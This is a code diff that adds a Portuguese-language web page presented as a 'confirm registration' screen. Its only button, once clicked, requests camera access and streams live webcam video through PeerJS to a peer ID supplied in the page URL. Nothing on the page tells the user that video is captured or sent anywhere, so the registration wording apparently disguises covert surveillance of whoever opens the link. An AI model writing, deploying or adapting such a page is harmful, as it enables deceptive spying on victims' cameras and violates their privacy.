@@ -1,0 +1,118 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Confirmar inscrição</title>
+
+<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+
+<style>
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  font-family: Arial, sans-serif;
+  background: #ffffff;
+}
+
+h2 {
+  font-size: 26px;
+  margin-bottom: 30px;
+}
+
+button {
+  background: #2563eb;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  padding: 16px 30px;
+  font-size: 17px;
+  cursor: pointer;
+}
+
+button:disabled {
+  opacity: 0.6;
+  cursor: default;
+}
+</style>
+</head>
+
+<body>
+
+<h2>Confirmar inscrição</h2>
+
+<button id="iniciar" disabled>Confirmar inscrição</button>
+
+<script>
+const room = new URLSearchParams(location.search).get("room");
+const botao = document.getElementById("iniciar");
+
+let peer = null;
+let stream = null;
+let chamada = null;
+
+if (room) {
+  peer = new Peer();
+
+  peer.on("open", () => {
+    botao.disabled = false;
+  });
+}
+
+botao.onclick = async () => {
+  if (!room || !peer || peer.destroyed) return;
+
+  botao.disabled = true;
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: false
+    });
+
+    chamada = peer.call(room, stream);
+
+    if (!chamada) {
+      throw new Error("Falha na conexão");
+    }
+
+    chamada.on("close", encerrar);
+    chamada.on("error", encerrar);
+
+  } catch (erro) {
+    encerrar();
+  }
+};
+
+function encerrar() {
+  if (chamada) {
+    chamada.close();
+    chamada = null;
+  }
+
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+    stream = null;
+  }
+
+  botao.disabled = false;
+}
+
+window.addEventListener("pagehide", () => {
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
+});
+</script>
+
+</body>
+</html>
